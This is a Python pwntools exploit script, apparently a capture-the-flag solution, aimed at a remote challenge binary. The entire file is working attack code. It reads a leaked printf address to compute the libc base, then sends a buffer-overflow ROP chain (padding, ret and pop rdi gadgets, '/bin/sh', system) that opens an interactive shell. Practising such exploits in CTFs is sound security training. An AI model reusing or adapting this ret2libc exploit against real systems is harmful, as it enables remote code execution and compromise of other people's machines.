#!/usr/bin/env python3

from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./challenge')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")

host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50005)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#io = start(env={"LD_PRELOAD": "./libc.so.6"})
io = start()
data = io.recvuntil("\n\n")

printf = int(re.search(b"printf is at ([0-9a-f]+)", data).group(1), 16)
libc.address = printf - libc.sym.printf

log.info("Printf leak 0x%x", printf)
log.info("Libc 0x%x", libc.address)

pop_rdi = libc.address + 0x000000000002155f

payload = (
    b"A" * 0x90 + # buf
    b"B" * 0x8 + # rbp
    p64(pop_rdi + 1)+ 
    p64(pop_rdi) +
    p64(next(libc.search(b"/bin/sh"))) +
    p64(libc.sym.system)
)

io.sendline(payload)

io.interactive()

